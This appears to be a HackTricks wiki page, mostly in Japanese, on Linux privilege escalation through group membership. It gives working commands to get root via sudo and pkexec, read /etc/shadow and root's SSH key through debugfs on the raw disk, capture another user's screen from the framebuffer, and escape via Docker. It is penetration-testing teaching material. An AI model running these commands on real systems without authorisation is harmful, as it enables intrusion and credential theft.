{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

# Sudo/Admin Groups

## **PE - Method 1**

**時々、** **デフォルトで（またはいくつかのソフトウェアが必要とするために）** **/etc/sudoers** ファイル内にこれらの行のいくつかを見つけることができます:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
これは、**sudoまたはadminグループに属する任意のユーザーがsudoとして何でも実行できる**ことを意味します。

この場合、**rootになるには、単に次を実行すればよい**:
```text
sudo su
```
## PE - Method 2

すべてのsuidバイナリを見つけ、バイナリ**Pkexec**があるかどうかを確認します:
```bash
find / -perm -4000 2>/dev/null
```
もしバイナリ pkexec が SUID バイナリであり、あなたが sudo または admin に属している場合、pkexec を使用して sudo としてバイナリを実行できる可能性があります。次の内容を確認してください:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
そこでは、どのグループが**pkexec**を実行することを許可されているか、そして**デフォルトで**いくつかのLinuxに**表示される**グループが**sudoまたはadmin**であるかを見つけることができます。

**rootになるには、次のコマンドを実行できます**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
もし**pkexec**を実行し、この**エラー**が表示された場合：
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**権限がないからではなく、GUIなしで接続されていないからです**。この問題の回避策があります: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。**2つの異なるsshセッション**が必要です:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Wheel Group

**時々**、**デフォルトで** **/etc/sudoers** ファイル内にこの行を見つけることができます:
```text
%wheel	ALL=(ALL:ALL) ALL
```
これは、**wheelグループに属する任意のユーザーがsudoとして何でも実行できる**ことを意味します。

この場合、**rootになるには、単に次を実行すればよい**:
```text
sudo su
```
# Shadow Group

**shadow** グループのユーザーは **/etc/shadow** ファイルを **読む** ことができます:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, read the file and try to **crack some hashes**.

# ディスクグループ

この特権はほぼ **ルートアクセスと同等** であり、マシン内のすべてのデータにアクセスできます。

ファイル: `/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
注意してほしいのは、debugfsを使用すると**ファイルを書き込む**こともできるということです。例えば、`/tmp/asd1.txt`を`/tmp/asd2.txt`にコピーするには、次のようにします：
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
しかし、**rootが所有するファイル**（例えば`/etc/shadow`や`/etc/passwd`）に書き込もうとすると、"**Permission denied**"エラーが発生します。

# Video Group

コマンド`w`を使用すると、**システムにログインしているユーザー**を見つけることができ、次のような出力が表示されます：
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**は、ユーザー**yossiが物理的に**マシンのターミナルにログインしていることを意味します。

**videoグループ**は、画面出力を表示するアクセス権を持っています。基本的に、画面を観察することができます。そのためには、**画面上の現在の画像を**生データで取得し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存でき、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**生の画像**を**開く**には、**GIMP**を使用し、**`screen.raw`**ファイルを選択し、ファイルタイプとして**Raw image data**を選択します：

![](../../.gitbook/assets/image%20%28208%29.png)

次に、幅と高さを画面で使用されているものに変更し、異なる画像タイプを確認して（画面をより良く表示するものを選択します）：

![](../../.gitbook/assets/image%20%28295%29.png)

# ルートグループ

デフォルトでは、**ルートグループのメンバー**は、**サービス**の設定ファイルや**ライブラリ**ファイル、または特権昇格に使用できる**他の興味深いもの**を**変更**するアクセス権を持っているようです...

**ルートメンバーが変更できるファイルを確認する**：
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker Group

ホストマシンのルートファイルシステムをインスタンスのボリュームにマウントできます。インスタンスが起動すると、すぐにそのボリュームに`chroot`をロードします。これにより、実質的にマシン上でルート権限を得ることができます。

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd Group

[lxc - Privilege Escalation](lxd-privilege-escalation.md)

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection)を使用して、世界で最も高度なコミュニティツールによって駆動される**ワークフローを簡単に構築し、自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

{% hint style="success" %}
AWSハッキングを学び、練習する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングトリックを共有してください。

</details>
{% endhint %}
